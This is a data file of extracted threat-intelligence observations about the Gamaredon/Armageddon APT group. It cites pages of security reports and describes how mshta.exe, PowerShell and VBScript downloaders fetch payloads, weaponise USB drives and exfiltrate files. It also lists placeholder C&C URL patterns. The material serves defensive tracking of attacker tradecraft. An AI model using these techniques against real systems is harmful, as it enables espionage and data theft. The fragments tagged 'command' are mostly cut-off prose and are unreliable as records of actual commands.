1.0.0,actor--gamaredon,artifact--sha256:a5e4498e4642863c45f6ca04d92a188fa39580b14446821ec1841d081593d7ca,observation--sha256:d29e7d5be0aff18dd6f0f48064b5e9b1f7cc49eac748164a2d21b4fc410866dd,command,links to download and execute C2 files using program mshta.exe.,links to download and execute C2 files using program mshta.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"- repeating the cycle laid down in the file, which allows you to download and run almost any file in the system and provides full control over the system; - checking the file size before start and in case of conformity to conditions, the file is started; - searching for all available disks with letters from ""D"" to ""Z""; - checking for the possibility of creating and executing processes, as well as the presence of a connection to the Internet and to the command & control server of attackers; - dow",
1.0.0,actor--gamaredon,artifact--sha256:4cd2740b43e92d73de39f94e4ca732ee61d2cd01be02f8d230d5ecd6ffe1a41f,observation--sha256:a2b3b83cac1d671ab0bbcba6499871d2d6b2e435e96e5e177e8be1b37b1f4f2a,command,merely uses the Windows API function ShellExecuteA to launch powershell.exe with two values –,merely uses the Windows API function ShellExecuteA to launch powershell.exe with two values –,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"32 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroClone Discovered by ESET Research in July 2023, PteroClone (SHA-1: 5720FFDF9D9CD649445CBC12844E2B587622643A ) is a unique PowerShell tool that uses a legitimate command line program – rclone – for managing files on cloud storage to download the next stage . It first downloads the rclone binary and c onfiguration file to %APPDATA%\Defrag , naming them Defrag.exe and rclone.conf , respectively. It",
1.0.0,actor--gamaredon,artifact--sha256:192b35b1a206f5ee5c665d5025d2392f7b51778b5ca7bfd917ae240fda52f536,observation--sha256:6731a8821f0d21428fe2946d8d10547122c284b1b8007a0b87441d5dd7c0fc1f,command,"mshta.exe process, which d ownloads and runs an HTA payload.","mshta.exe process, which d ownloads and runs an HTA payload",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"21 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 payload, pauses for a few seconds, and deletes all three files: the dropper, itself, and the VBScript payload. Throughout PteroCDrop’s lifetime, Gamaredon has used various compilers to build it and in some of the samples this PDB path was left: E:\Projects\sfx\Extractor10\281021\Debug\090721.pdb Overall, the most prevalent payload delivered by PteroCDrop is a VBScript version of PteroLNK. During 2023",
1.0.0,actor--gamaredon,artifact--sha256:cb2a10f81296588c14f1fdcaa21457b2456e99b3d897cd2781fe14ed86ca10ab,observation--sha256:5a5573a68d572343800affe4cf53b4611d1b5799e5d3eec288f0824bffe29640,command,obfuscate its payload. The PowerShell layer attempts to download PteroPSDoor from the dead -drop,obfuscate its payload. The PowerShell layer attempts to download PteroPSDoor from the dead -drop,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:9d0b5067b3add468dc8bfd4cbdcdac821c87ab2d73d259f8dee17f626eb5e1bf,observation--sha256:fe91eace497981d3a53b2382489d3595a9fb2877a43d6996deda80f4db871ce8,command,on PowerShell.,on PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"At the same time, it turned out that depending on the operating system and the transition time, the victim received different content. On the day of the investigation, before 10 a.m, the .scr arc hive was downloaded, and after 11 a.m., the .rar archive was downloaded from the same link. At some time, when communication initiates from a mobile Android device, the user's browser redirected to the phishing page Google Play http://google -play.serveftp [.]com/ (hosting provider Expert Llc). However,",
1.0.0,actor--gamaredon,artifact--sha256:63ca65e47b8af1ce70fe47706bd188021c21420eb1f50b03196410568f8d1aac,observation--sha256:5ea32efbc22345699c29d6e4d4c8d3fa61fd3d168018033c7b85d7f45d454e7c,command,one is a PowerShell script encapsulated in a VBScript.,one is a PowerShell script encapsulated in a VBScript,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Downloader of PteroPSDoor variant 2 We know about two versions of the downloader that deploys PteroPSDoor variant 2 . Their functionality is similar, but the older one is a VBScript with an embedded PowerShell command line, while the newer one is a PowerShell script encapsulated in a VBScript. The older version uses the URI /new and comprises two parts. The first part executes a brief PowerShell comm",
1.0.0,actor--gamaredon,artifact--sha256:415e0b5c7b19702d083aa3d9f1c3dccf4cc5071acb0e1249ffd93b2debeb18f1,observation--sha256:3ecb5963e292e1b80ae612ec09178b007bbd5a57017dd4982aef8dabfc3552d4,command,"opened by a victim, launche s mshta.exe with a URL argument to fetch another HTA file that embeds the","opened by a victim, launche s mshta.exe with a URL argument to fetch another HTA file that embeds the",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances simulate downloading such archives. These archives contain a malicious HTA downloader that , when opened by a victim, launche s mshta.exe with a URL argument to fetch another HTA file that embeds the VBScript downloader, PteroSand (see Figure 1). Notably, in two campaigns, the HTA downloaders were compressed with bzip2 instead of being packed in archives. Figure 1. Simplified scheme of a typical Gama redon spearphish",
1.0.0,actor--gamaredon,artifact--sha256:2e7801f2b4aa0d406edbdb3429698b7038b86f23fc923f48d9e05fcb4a702360,observation--sha256:fabc0cc864978d76acb8a5e3978ce29a188c2114219c4df739a310295df69657,command,"order. This obfuscated, base64 -encoded PowerShell script remained wrapped in VBScript. As of October","order. This obfuscated, base64 -encoded PowerShell script remained wrapped in VBScript. As of October",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:b4455cff5eb0614806ca769c9e53e824400d3eaaa34f9d4716c892cecfc7a471,observation--sha256:91125047f9d8743c3278cff969efd1f8813b7a7469b30312944b94867e91742e,command,"originating from powershell.exe ; for Windows 10 and 11, cu rl.exe is used instead. If that fails, an","originating from powershell.exe ; for Windows 10 and 11, cu rl.exe is used instead. If that fails, an",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:fca9ff619d347648f005aba012373d4068c7dd07fbdbfb4e201c1f85981dc4ac,observation--sha256:2b2c4609b5b2299f782ca3d6e91c1d278cd87e713bf111fb653e6018c0cf28b8,command,"payload types: a PowerShell command , or an encrypted VBScript file.","payload types: a PowerShell command , or an encrypted VBScript file",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:e751d86820e3406a233f2823fcb5180f6f9d11fb50ff7cbca5966117af48b52f,observation--sha256:a34356a0b55d19d5ec82193977aa60f2da7c0292ec64652377c211104e050361,command,phishing email. This LNK file initiates the next stage of the attack using mshta.exe which is a,phishing email. This LNK file initiates the next stage of the attack using mshta.exe which is a,candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 8 Here you see an example of one of the malicious docx files that Armageddon uses. MITRE ATT&CK TECHNIQUE NAME TECHNIQUE ID Spearphishing Attachment T1566.001 User Execution T1204.002 Template Injection T1221 TAR Contains Malicious LNK File Similarly, a compressed TAR file containing a malicious LNK file is sent through a phishing email. This LNK file initiates the next stage of the attack using mshta.ex",
1.0.0,actor--gamaredon,artifact--sha256:5fcec11256c17bc43086f4d5ce126f1fd2fff96f0b4d2ff46544a7206c2b15cf,observation--sha256:974c663c3fd18a80c79b451fb8b9bb71211754fa709d6131b39de2cc4da7728b,command,powershell.exe and the HTTP request sent by cloudflared.exe to the C&C server does not contain,powershell.exe and the HTTP request sent by cloudflared.exe to the C&C server does not contain,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:73a5d1601f79cf9ee746a2db541b8a18badf216051c24a49e78e561d750fd057,observation--sha256:bcd75daf48cc40d8f28ee4af080c2e26b9428c9eccf62429fac814c9f885c573,command,"preparing system information for exfiltration (see Figure 17), as PowerShell includes field names directly in","preparing system information for exfiltration (see Figure 17), as PowerShell includes field names directly in",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"26 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 16. An example of a PteroVDoor decryptor Persistence PteroVDoor instances observed until May 31st, 2025 ensure persistence via the HKCU Run key with the registry value named GooglePhone . The instances observed between May 31st, 2025 and September 18th, 2025 don’t use any persistence mechanisms. And the instances observed after September 18th, 2025 are persisted via the PteroVDoor decryptor, which loads them ",
1.0.0,actor--gamaredon,artifact--sha256:612f70bddbdecccd90ede25bf4cb1024fe2a135543ef3de62962455d008ce033,observation--sha256:0f25312d0cfa442ac833412c5a0d7b7e68503039f610043e0a310be9ecdb060e,command,"retrieved C&C server, it can download and execute up to 50 PowerShell payloads. After each individual","retrieved C&C server, it can download and execute up to 50 PowerShell payloads. After each individual",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 11. PteroEffigy Capabilities PteroEffigy acquires its C&C server from the G oFile cloud storage service using its REST API. Then, from the retrieved C&C server, it can download and execute up to 50 PowerShell payloads. After each individual download attempt, it sleeps for five minutes. Network protocol For communication with its C&C server, PteroEffigy uses an HTTP GET request with the URI path /index.php and",
1.0.0,actor--gamaredon,artifact--sha256:8ca441ef9a9e81fb403c5f7704463027d0a064b01dd96c908365d741fe2bf902,observation--sha256:bf06daa79676492c6eb596bf03db26e7c33cd66e869fa49f1c78781c37cb7a1d,command,rundll32.exe to execute payloads.,rundll32.exe to execute payloads,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:cb167979fe01949236d1fe0b7ecbc3fa454b93443e0cf05ac7d88262599d1400,observation--sha256:a8a9e4abeafe6f2f86492d7fc4bd138c38ee4192eb083616ed1cc989a3d211d1,command,suspicious than making them directly from PowerShell.,suspicious than making them directly from PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:c0b550d51f0078c5be1bdc218b90f9b170d79826d3b0d23a7c7f6d6fd78be61c,observation--sha256:aee184848d36952c41d69e671ef4832ef1e99b088e7b58b38a374088639150da,command,that runs the embedded downloader in a separate PowerShell process.,that runs the embedded downloader in a separate PowerShell process,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:cb5b632e1f3c489ee37f07cf27ba82e811a493d13acfc48b2b41670471ad906f,observation--sha256:396ee0e9f07d36b2d252e55e70f907f0effb3924c825b30ecb6f906d39609066,command,"the * character, and then executes the second part, which is the aforementioned PowerShell command","the * character, and then executes the second part, which is the aforementioned PowerShell command",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:faa7fc2b59135e04942624d0b392e82c4bd34577067962fe52789636c0439241,observation--sha256:27c3a6b30cc047c39a9c5baf3df705e8c4c862b3fe739fd065621453b8896f83,command,"the same time, PowerShell commands were actually intended to","the same time, PowerShell commands were actually intended to",candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShell The Security Service of Ukraine has detected Armageddon using two types of PowerShell scripts. One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module – the executable file with its simultaneous hidden start (Figure 9). Figure 9. PowerShell script example Another script file contained 4039 lines of program code. At the same time, PowerShell commands were actually inten",
1.0.0,actor--gamaredon,artifact--sha256:1453567fdd98a10ed3a572721ef8997ba9dc05f80447502cf305e8fbb36921eb,observation--sha256:c1e04f775cbb027722d5bb75c11e4b758ba549f9914ed0f4dffb7e97db45d7e8,command,"then after every executed command , it displays a typical PowerShell prompt in the format PS","then after every executed command , it displays a typical PowerShell prompt in the format PS",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:b79aca6938714150349fa34661865d961b87d81ed2acd9b82d4a67307da729ab,observation--sha256:d2d19e9e769cad3b07e55060719ad74b4ec66d5db4709c6aea8a1f066b4875fe,command,then also appends a PowerShell command that spawns a new PowerShell process that decodes and,then also appends a PowerShell command that spawns a new PowerShell process that decodes and,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After the LNK file is created, the weaponizer component first appends a single * character to the file, and then also appends a PowerShell command that spawns a new PowerShell process that decodes and executes an embedded base64 -encoded downloader while passing a hardcoded R entry URL as an argument to the downloader’s only function – run. When the LNK file is first created, its target is set to execute a PowerShel",
1.0.0,actor--gamaredon,artifact--sha256:84ac694a3424a4fa6c75582d4635edc22e5c72616065c6fcb1cc364c6a28fb5a,observation--sha256:c2861277c76c39a976be281c81e3a10d806639364c7e330ec6be250a05a980dc,command,then weaponizes discovered drives by dropping malicious LNK files and PowerShell scripts onto them.,then weaponizes discovered drives by dropping malicious LNK files and PowerShell scripts onto them,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"11 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances • a downloader, • an embedded weaponizer, and • an embedded runner. The downloader is created from an embedded template and regularly retriev es payloads from dead drops. Later instances retrieve payloads from C&C servers hidden behind tunnel services, not from dead drops. Most PteroPaste payloads seen in ESET telemetry were instances of PteroEffigy , described in a later section. The rest were Turla PowerShell payl",
1.0.0,actor--gamaredon,artifact--sha256:7b4bd242f5c6aa78dfb3d96e0599eea17cb0cfc96fa1b0373253badf3fa763e4,observation--sha256:9c500907e3d8b03ce06acb171b26a7c35607a094c0bd4a0fb36b0623d5fd8632,command,"these LNK f iles launched the mshta.exe process with a URL as an argument. As shown in Figure 3, the","these LNK f iles launched the mshta.exe process with a URL as an argument. As shown in Figure 3, the",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 organization. These two methods are described rather briefly in this section, because they are examined in det ail in the respective sections covering the tools involved. Spearphishing campaigns A typical Gamaredon spearphishing campaign employs a spearphishing email with a malicious attachment that contains either a LNK or an HTA file that is served to a potential victim. The files from email attachm",
1.0.0,actor--gamaredon,artifact--sha256:85fc8db4d1e9cc8999c27c52faa7892cf263b8d639cef235032fcd384b1b1a85,observation--sha256:269945c19b880630458efc78a8fdb9c1c59a46d65e3c6da0991be31ba1118ce2,command,using two types of PowerShell scripts.,using two types of PowerShell scripts,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"PowerShell The Security Service of Ukraine has detected Armageddon using two types of PowerShell scripts. One of them is designed to obtain information about the user and the information system, sending it to the command & control server, loading in response an additional module – the executable file with its simultaneous hidden start (Figure 9). Figure 9. PowerShell script example Another script file contained 4039 lines of program code. At the same time, PowerShell commands were actually inten",
1.0.0,actor--gamaredon,artifact--sha256:d1b9aac4e3d1b0477070fe02026d44cb84e7abdeb88b7ac096852794bc9ec905,observation--sha256:5362271587f3adf962bb7dd925ffea073c8efdf9983c0afc3a0111fbbe4c722a,command,utility curl for sending HTTP requests when attempting to obtai n the C&C IP address via the,utility curl for sending HTTP requests when attempting to obtai n the C&C IP address via the,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:f0f55dedafd8e325f2da371b0eeb9400c5542145c626ad3291504b1f1e1806ba,observation--sha256:e8c2b6db23291f285bb93cad9690727c590e2c777b96d4921d9f3c27eb741b44,command,"weaponize USB drives and to download additional PowerShell payloads via an encrypted channel, similar","weaponize USB drives and to download additional PowerShell payloads via an encrypted channel, similar",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Figure 4. PteroDum Capabilities PteroDum can fetch and execute up to 10 VBScript payloads from a hardcoded C&C server. When PteroDum receives a response, it expects that response to be a base64 -encoded VBScript with ;; tokens inserted at random positions. After removing those tokens and decoding the result, PteroDum stores the VBScript in a randomly named file with a .vbs extension in the system temporary directory",
1.0.0,actor--gamaredon,artifact--sha256:1aeb1ea70d23fb3f30f2aa3d664f21cfd3689621c7e5dc7d233f2bb67bc88e34,observation--sha256:c4077932649ff7bc22c8459698bbdca289a6ab1bbb1a6d5a3ce37c465a3537e8,command,"well as using CMD, PowerShell and .NET command shells.","well as using CMD, PowerShell and .NET command shells",candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"cyber attacks algorithm repeatability and regular mass sending of malicious messages to the same circle of addressees; derogatory password phrases encoded in malicious software, etc. The cyber attack mechanism is based on the principle of simultaneous mass destruction of a large number of users inside one organization and the deployment of malicious software. When the victim's computer system loses control, the attackers try to regain access to the source of the information and try again to comp",
1.0.0,actor--gamaredon,artifact--sha256:19a91fa5a51ad7f8566ed2abda1a89b458f69a243283f6f9af472d2e7d57c293,observation--sha256:ac6faff1f4e2cd6b1171ba4e902d04962641f42d29462a79e2e0597754bd92da,command,where <n> is a counter initialized to 0 and increased by one for each part . It then creates a PowerShell,where <n> is a counter initialized to 0 and increased by one for each part . It then creates a PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,18 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Associated URL patterns Downloader of PteroSteal http://<IP>/pass http://<IP>/password http://<IP>/scripts/password.txt http://<IP>/admin/password.txt http://<IP>/test/password.txt http://<IP>/log/password.txt http://<IP>/in dex/password.txt http://<IP>/files/password.txt http://<IP>/local/password.txt http://<IP>/js/password.txt http://<IP>/phpmyadmin/password.txt http://<IP>/core/password.txt http:,
1.0.0,actor--gamaredon,artifact--sha256:ccec68fbe36f78d50a2d8ea94ede0e24cd423b46b57dca52342c4618729bf692,observation--sha256:75713253b824d24bbd6d5bc51811d5572623e6dab4ec5e80df14b6f000a9bbb1,command,wrapper dropped to %LOCALAPPDATA% \info.vbs that runs the PowerShell loader .,wrapper dropped to %LOCALAPPDATA% \info.vbs that runs the PowerShell loader,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances PteroBox PteroBox is a known Gamaredon file stealer that we discovered at the end of 2024, and detailed in our Gamaredon 2024 white paper. During 2025, we discovered a new variant of PteroBox that uses the rclone utility to exfiltrate files to Dropbox; therefore, we named it the rclone variant. The API variant, as we now call the original variant, has been updated a few times throughout 2025, and both variants have ",
1.0.0,actor--gamaredon,artifact--sha256:fc78dbd93da7a11f7b93fb87df430f53564bef1337bb629bb20637ef4f10b3c0,observation--sha256:e348972ac162df6556798273e4b64247107ef17c829fea3f6a674f17cbbcadbb,command,"· Gamaredon ’s toolset mainly includes custom -made malware written in PowerShell, VBScript, and","· Gamaredon ’s toolset mainly includes custom -made malware written in PowerShell, VBScript, and",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"2 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 EXECUTIVE SUMMARY In this white paper , we provide a comprehensive technical analysis of the toolset used by the Gamaredon advanced persistent threat (APT) group to conduct its cyberespionage activities in 2022 and 2023 , or since the war in Ukraine escalated in February 2022. This Russia- aligned group has been active since at least 2013 and is currently the most active threat actor in Ukraine, focus",
1.0.0,actor--gamaredon,artifact--sha256:25d18683c1dae912c192dcf33d8e546ef114337c8bce72f1fd41465873190677,observation--sha256:f61b5a176f727b61e2ceef1b105f97966b30ae6b6a53e84999686073f0da19cb,command,"· If the response body starts with the ! character , a PowerShell command follows this character,","· If the response body starts with the ! character , a PowerShell command follows this character",candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 General -purpose downloaders We recognize eight types of general -purpose downloaders: five standalone and three built -in. Standalone downloaders primarily deliver payloads, whereas built -in dow nloaders have other primary capabilities but can also deliver payloads. PteroPSLoad PteroPSLoad is a downloader written in PowerShell that we discovered in October 2021 . After it is deployed, it remains pe",
1.0.0,actor--gamaredon,artifact--sha256:582a7aac1e61211be91ed0480bbb5151cda5dc3ca4596e53ee1724ab3febe982,observation--sha256:b66ac5da1744495224b9eee8b958731f758a2d19cef94b968a79144da3b7e7b3,command,"• Gamaredon operators developed and deployed six new , malicious PowerShell tools, which we analyze","• Gamaredon operators developed and deployed six new , malicious PowerShell tools, which we analyze",candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"3 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances EXECUTIVE SUMMARY In this white paper , we provide both a comprehensive technical analysis of the new tools in Gamaredon’s arsenal, and a detailed description of some significant updates to known tools , all observed during 2025. Furthermore, we share details about various technologies that Gamaredon operators abused to protect their network infrastructure. Key findings : • Throughout 2025, Gamaredon exclusively targ",
